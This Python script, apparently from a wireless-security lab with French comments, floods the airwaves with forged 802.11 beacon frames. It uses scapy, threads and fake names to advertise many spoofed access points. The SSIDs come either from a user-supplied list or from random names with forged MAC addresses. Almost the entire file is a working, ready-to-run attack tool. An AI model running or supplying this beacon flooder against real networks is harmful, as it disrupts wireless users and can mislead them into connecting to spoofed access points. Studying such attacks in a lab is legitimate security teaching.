# Authors : Delphine Scherler & Wenes Limem
# Date : 31.03.2022
# Description : Le script permet d'inonder la salle avec des SSID dont le nom correspond à une liste contenue dans un
# fichier text fournit par un utilisateur. Si l'utilisateur ne possède pas une liste, il peut spécifier le nombre d'AP
# à générer. Les SSID seront alors générés de manière aléatoire.

from scapy.all import *
from threading import Thread
from faker import Faker
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap

# method to send beacon
def send_beacon(ssid, mac, infinite=True):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    # ESS+privacy to appear as secured on some devices
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap() / dot11 / beacon / essid
    sendp(frame, inter=0.1, loop=1, iface=iface, verbose=0)


if __name__ == "__main__":
    # ask the user if he wants to use a file
    f = input("Do you want to use a file [Y|N]: ")
    if f.__eq__('Y') or f.__eq__('y'):
        iface = "wlan0"
        # ask for the file
        path_to_file = input("Path to file:")
        # open and read the file
        fl = open(path_to_file, "r")
        list_of_lines = []
        for line in fl:
            stripped_line = line.strip()
            line_list = stripped_line.split()
            list_of_lines.append(line_list)
        print("Generating beacons, names are based on input file ... \n")
        for i in list_of_lines:
            ssid = i[0] + i[1]
            mac = i[2]
            # send beacon with the names
            Thread(target=send_beacon, args=(ssid, mac)).start()
            print(ssid, mac)
    else:
        # ask for number of access points
        n_ap = int(input("How many APs would you like to generate? "))
        iface = "wlan0"
        # generate random SSIDs and MACs
        faker = Faker()
        ssids_macs = [(faker.name(), faker.mac_address()) for i in range(n_ap)]
        print("Generating beacons, names are faked... \n")
        for ssid, mac in ssids_macs:
            Thread(target=send_beacon, args=(ssid, mac)).start()
            print(ssid, mac)
